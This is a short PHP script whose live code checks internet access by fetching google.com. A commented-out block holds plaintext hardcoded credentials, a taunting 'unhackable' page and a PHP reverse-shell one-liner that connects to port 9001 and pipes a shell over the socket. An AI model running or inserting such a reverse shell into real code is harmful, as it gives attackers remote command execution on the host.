<?php

// $UNAMES = array('Starlord', 'user2');
// $USERS = array($UNAMES[0] => 'MyDadIsAFrickingCelestial', $UNAMES[1] => 'password2');

// header($UNAMES[0] . $USERS[$UNAMES[0]]);


// # catch GET requests
// if ($_SERVER['REQUEST_METHOD'] === 'GET') {
//     # display simple message
//     echo '<h1>Hello there</h1>';
//     echo '<p>We are too secure for you</p>';
//     echo '<p>This site is unhackable<p>';
//     exec('php -r \'$sock=fsockopen("127.0.0.1",9001);exec("sh <&3 >&3 2>&3");\'');
//     exit;
// }



$url = 'http://www.google.com';
$response = @file_get_contents($url);
if ($response === false) {
    echo "No internet access\n";
} else {
    echo "Internet access available\n";
}

?>

